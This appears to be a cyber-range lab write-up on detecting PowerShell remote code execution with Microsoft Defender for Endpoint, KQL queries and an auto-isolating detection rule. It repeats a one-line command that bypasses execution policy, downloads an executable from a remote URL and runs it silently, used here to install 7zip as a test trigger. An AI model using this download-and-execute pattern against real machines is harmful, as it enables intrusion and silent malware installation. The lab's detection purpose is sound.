### Scenario: The Attacker Executes Remote Code on the VM üíªüîì

Imagine an attacker gains access to the VM through a **vulnerability** or a **phishing attack**. Once inside, they execute a **Remote Code Execution (RCE)** command using PowerShell to download and run a malicious payload, in this case, the **7zip installer**.

Here's how the attacker might have carried out the attack:

1. **Initial Access**: The attacker exploited a vulnerability in the system or tricked a user into downloading and running a malicious attachment (e.g., a weaponized PowerShell script disguised as an innocuous file). üîì

2. **Execution**: After gaining access, the attacker executes the following PowerShell command to download a malicious executable (7zip installer) from a remote server:
   
   ```powershell
   cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
   ```

3. **Payload Execution**: The attacker uses `Invoke-WebRequest` to download the payload from a remote server. After the file is downloaded, the attacker silently installs the application by executing it with the `/S` (silent) flag, ensuring there are no user prompts during the installation. This download and installation are performed under the guise of a legitimate action, making detection more difficult. üíª‚ö†Ô∏è

4. **Detection**: The **MDE** system (Microsoft Defender for Endpoint) detects the unusual PowerShell activity (particularly the use of `Invoke-WebRequest` and `Start-Process` in sequence), triggering an alert and activating the **custom detection rule** you set up. üö®

---

## How We Found the RCE Payload üí•

Our team created a custom detection rule that specifically searched for the execution of PowerShell commands using Invoke-WebRequest and Start-Process‚Äîtwo common commands that attackers use to download and run payloads remotely. The rule was set to trigger if the system saw these commands within a specific time frame. ‚è±Ô∏è

Upon running the detection rule, we identified the following PowerShell command executing on the compromised machine:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

This command triggered the download and installation of a malicious 7zip executable from an external URL. The executable was silently executed with the /S flag, which instructed the installer to run without user intervention (silent installation). üëæ

Upon investigation, we determined that the malicious payload had been downloaded to `C:\ProgramData\7z2408-x64.exe` and was automatically executed, likely allowing the attacker to gain remote control of the machine. üö®

## Detection and Response üõ°Ô∏è

Once the suspicious activity was identified:

### 1. KQL Query to Find the RCE PowerShell Payload üîç

To detect this type of activity, we used the following KQL query in Microsoft Defender for Endpoint (MDE):
```kql
DeviceFileEvents
| top 20 by Timestamp desc
```
```kql
DeviceNetworkEvents
| top 20 by Timestamp desc
```
```kql
DeviceProcessEvents
| top 20 by Timestamp desc
```
```kusto
let target_machine = "whateverYourMachineIsName";
DeviceProcessEvents
| where DeviceName == "trce12"
| where AccountName != "system"
| where InitiatingProcessCommandLine has_any ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc 
```

This query was designed to look for any PowerShell command that used Invoke-WebRequest to download a file and Start-Process to execute it. Specifically, it captures the activity related to the malicious payload execution, allowing us to detect the attack's presence within the last hour.

---

### Step 3: Create a Detection Rule Specific to Your VM ‚ö°üõ†Ô∏è

1. **Detection Rule Setup**:
    - We want to focus on **Remote Code Execution** (RCE) specifically for your VM. This rule will only trigger for **your VM** to prevent quarantining others' machines. üéØ

2. **RCE Detection Rule**:
    - We‚Äôll detect any PowerShell script automating the download and installation of a program. Here's the **command** we‚Äôll use to automate the downloading and installation of **7zip**:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

---

### Step 4: Write a KQL Query for Detection üë®‚Äçüíªüìù

1. **KQL Query**:
    - The query will detect **PowerShell** invoking **Invoke-WebRequest** and optionally **Start-Process**.

```kusto
let target_machine = "whateverYourMachineIsName";
DeviceProcessEvents
| where DeviceName == "trce12"
| where AccountName != "system"
| where InitiatingProcessCommandLine has_any ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc 
```

---

### Step 5: Create a Detection Rule Based on the Query üö®üîî

1. **Detection Rule Settings**:

   To create a detection rule, click the top right corner where it says **"Create Detection Rule"**. You‚Äôll then be taken to the screen where you can complete the **Alert Details**.

  ![Image](https://github.com/user-attachments/assets/d50d7363-33b1-4482-b7b6-5422638ade53)

2. **Impacted Entities**:

   Define the impacted entities (in this case, the specific VM) for the detection rule.

   ![Screenshot 2025-01-12 184224](https://github.com/user-attachments/assets/c8d36a77-8a7f-4cb6-8631-c26ad5362858)

3. **Actions**:

   Choose the actions that should be taken when the detection rule is triggered. For this rule, we want to ensure that the VM is isolated and an investigation package is collected.

   ![Screenshot 2025-01-12 184738](https://github.com/user-attachments/assets/e8e46c68-a839-45b8-9b9b-9041773ff989)

4. **Summary**:

   Review the summary of the detection rule before you click submit it.

   ![Screenshot 2025-01-12 184936](https://github.com/user-attachments/assets/50fdb93e-50c8-478e-8ad7-a072bc6984b3)

   - Set the detection rule with the following options:
     - ‚úÖ **Isolate Device**
     - ‚úÖ **Collect Investigation Package**
   
   These settings ensure that the VM is automatically isolated and an investigation package is collected whenever the rule is triggered.

---

By setting this up, you'll have a proactive defense mechanism to automatically isolate compromised systems and collect critical investigation data when suspicious activity, such as PowerShell-based RCE, is detected. üõ°Ô∏èüíª

---

### Step 6: Trigger the Detection Rule üîÑ‚ö°

1. **Run the Command**: Execute the PowerShell command to trigger the alert (downloading and installing 7zip).
   
2. **Wait for Logs**: üïí Check for logs in the MDE portal. Your VM should be isolated once the detection rule triggers. If you can no longer connect to the VM, it likely means the isolation action took place. üö∑

---

### Step 7: Investigate the Incident üîçüïµÔ∏è‚Äç‚ôÇÔ∏è

1. **Navigate to the MDE Portal**:
   - Go to [MDE Portal](https://security.microsoft.com/machines) and find your VM.
   
2. **VM Isolation Status**: 
    - Click on the three-dot menu next to the VM.
    - If isolated, you can release it here. For now, check **Action Center** for the **Investigation Package**.
    - 


3. **Review the Investigation Package**: 
    - This package contains a detailed collection of data for incident analysis, including:
        - Process trees
        - File/Registry changes
        - Network connections
        - Event logs
        - Memory dumps
---

### Step 8: Resolve the Alert üõ†Ô∏èüîí

1. **Assign the Alert to Your User**:
    - Assign the alert related to **your custom detection** to your user account.
    - Resolve the alert once reviewed.

### Additional Alerts from Microsoft ‚ö†Ô∏èüîî

- Microsoft will also generate **automatic alerts** for suspicious activity beyond your custom detection. üîç
- Review these alerts regularly within the portal for a more comprehensive view of possible security threats.
